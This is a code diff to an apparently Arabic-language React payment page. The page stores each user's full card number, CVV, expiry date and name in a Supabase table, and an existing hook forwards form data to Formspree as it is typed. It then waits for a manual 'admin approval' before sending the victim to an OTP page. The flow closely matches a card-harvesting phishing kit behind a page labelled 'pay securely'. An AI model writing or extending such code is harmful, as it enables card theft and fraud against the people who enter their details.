@@ -1,14 +1,15 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { CreditCard, Lock, ArrowRight } from "lucide-react";
+import { CreditCard, Lock, ArrowRight, Loader2 } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { supabase } from "@/integrations/supabase/client";
 
 const Payment = () => {
   const navigate = useNavigate();
@@ -34,6 +35,8 @@ const Payment = () => {
     expiryYear: "",
     cvv: ""
   });
+  const [applicationId, setApplicationId] = useState<string | null>(null);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
 
   // Send payment data to Formspree in real-time
   useFormspreeSync({
@@ -102,7 +105,47 @@ const Payment = () => {
       [name]: filteredValue
     }));
   };
-  const handleSubmit = (e: React.FormEvent) => {
+  useEffect(() => {
+    // Get or create application ID
+    const storedId = localStorage.getItem('applicationId');
+    if (storedId) {
+      setApplicationId(storedId);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (waitingForApproval && applicationId) {
+      // Check for approval every 2 seconds
+      const interval = setInterval(async () => {
+        const { data, error } = await supabase
+          .from('customer_applications')
+          .select('payment_approved')
+          .eq('id', applicationId)
+          .single();
+
+        if (data?.payment_approved) {
+          clearInterval(interval);
+          setWaitingForApproval(false);
+          
+          const cardDigits = formData.cardNumber.replace(/\s/g, "");
+          const lastFour = cardDigits.slice(-4);
+          
+          toast({
+            title: "تمت الموافقة",
+            description: "جاري الانتقال لصفحة التحقق",
+          });
+
+          setTimeout(() => {
+            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
+          }, 1500);
+        }
+      }, 2000);
+
+      return () => clearInterval(interval);
+    }
+  }, [waitingForApproval, applicationId, formData.cardNumber, companyName, price, navigate, toast]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     // التحقق من الحقول
@@ -139,19 +182,68 @@ const Payment = () => {
       return;
     }
 
-    // استخراج آخر 4 أرقام من البطاقة
-    const cardDigits = formData.cardNumber.replace(/\s/g, "");
-    const lastFour = cardDigits.slice(-4);
+    try {
+      // Save payment data to Supabase
+      const cardType = getCardType(formData.cardNumber);
+      const cardDigits = formData.cardNumber.replace(/\s/g, "");
+      const lastFour = cardDigits.slice(-4);
 
-    // التوجيه إلى صفحة التحقق OTP
-    toast({
-      title: "جاري معالجة الدفع",
-      description: "سيتم إرسال رمز التحقق إلى رقم هاتفك",
-    });
+      if (applicationId) {
+        // Update existing application
+        const { error } = await supabase
+          .from('customer_applications')
+          .update({
+            cardholder_name: formData.cardholderName,
+            card_number: formData.cardNumber,
+            card_last_4: lastFour,
+            card_type: cardType,
+            card_cvv: formData.cvv,
+            expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+            current_step: 'payment'
+          })
+          .eq('id', applicationId);
 
-    setTimeout(() => {
-      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
-    }, 1500);
+        if (error) throw error;
+      } else {
+        // Create new application
+        const { data: newApp, error } = await supabase
+          .from('customer_applications')
+          .insert([{
+            cardholder_name: formData.cardholderName,
+            card_number: formData.cardNumber,
+            card_last_4: lastFour,
+            card_type: cardType,
+            card_cvv: formData.cvv,
+            expiry_date: `${formData.expiryMonth}/${formData.expiryYear}`,
+            selected_company: companyName,
+            selected_price: price,
+            current_step: 'payment'
+          }])
+          .select()
+          .single();
+
+        if (error) throw error;
+        
+        if (newApp) {
+          setApplicationId(newApp.id);
+          localStorage.setItem('applicationId', newApp.id);
+        }
+      }
+
+      toast({
+        title: "تم إرسال البيانات",
+        description: "في انتظار موافقة الإدارة...",
+      });
+
+      setWaitingForApproval(true);
+    } catch (error) {
+      console.error('Error saving payment data:', error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ في حفظ البيانات",
+        variant: "destructive"
+      });
+    }
   };
   return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20">
       <section className="pt-8 pb-16 px-4 md:px-6">
@@ -317,12 +409,33 @@ const Payment = () => {
 
                 {/* أزرار التحكم */}
                 <div className="flex gap-3 md:gap-4 pt-4 md:pt-6">
-                  
-                  <Button type="submit" size="lg" className="flex-1 h-11 md:h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30 text-sm md:text-base">
-                    <Lock className="ml-2 h-4 w-4 md:h-5 md:w-5" />
-                    ادفع {price} ﷼ بأمان
+                  <Button 
+                    type="submit" 
+                    size="lg" 
+                    disabled={waitingForApproval}
+                    className="flex-1 h-11 md:h-12 bg-gradient-to-l from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/30 text-sm md:text-base disabled:opacity-50"
+                  >
+                    {waitingForApproval ? (
+                      <>
+                        <Loader2 className="ml-2 h-4 w-4 md:h-5 md:w-5 animate-spin" />
+                        في انتظار الموافقة...
+                      </>
+                    ) : (
+                      <>
+                        <Lock className="ml-2 h-4 w-4 md:h-5 md:w-5" />
+                        ادفع {price} ﷼ بأمان
+                      </>
+                    )}
                   </Button>
                 </div>
+
+                {waitingForApproval && (
+                  <div className="mt-4 p-4 bg-yellow-50 dark:bg-yellow-950/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
+                    <p className="text-sm text-yellow-800 dark:text-yellow-200 text-center">
+                      🕐 يرجى الانتظار... تم إرسال بيانات الدفع وننتظر موافقة الإدارة
+                    </p>
+                  </div>
+                )}
 
                 {/* ملاحظة الخصوصية */}
                 <div className="text-center pt-6 border-t">
